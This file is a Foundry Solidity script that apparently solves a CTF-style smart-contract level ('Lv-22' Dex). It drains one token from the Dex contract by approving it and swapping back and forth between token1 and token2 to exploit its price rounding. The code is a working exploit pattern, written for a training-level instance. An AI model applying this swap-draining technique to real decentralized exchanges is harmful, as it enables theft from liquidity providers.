// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Dex, IERC20} from "../src/Lv-22/DEX.sol";

contract DexScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN DEX INSTANCE ADDRESS
       Dex _dex = Dex(0xBd3Ec5cC44Ff40C31bE849d833F33Ebf82590b78);
       _dex.approve(address(_dex), type(uint256).max);
       _dex.swap(_dex.token1(), _dex.token2(), IERC20(_dex.token1()).balanceOf(msg.sender));
         _dex.swap(_dex.token2(), _dex.token1(), IERC20(_dex.token2()).balanceOf(msg.sender));
          _dex.swap(_dex.token1(), _dex.token2(), IERC20(_dex.token1()).balanceOf(msg.sender));
         _dex.swap(_dex.token2(), _dex.token1(), IERC20(_dex.token2()).balanceOf(msg.sender));
           _dex.swap(_dex.token1(), _dex.token2(), IERC20(_dex.token1()).balanceOf(msg.sender));
            _dex.swap(_dex.token2(), _dex.token1(), 45);

        vm.stopBroadcast();
    }
}
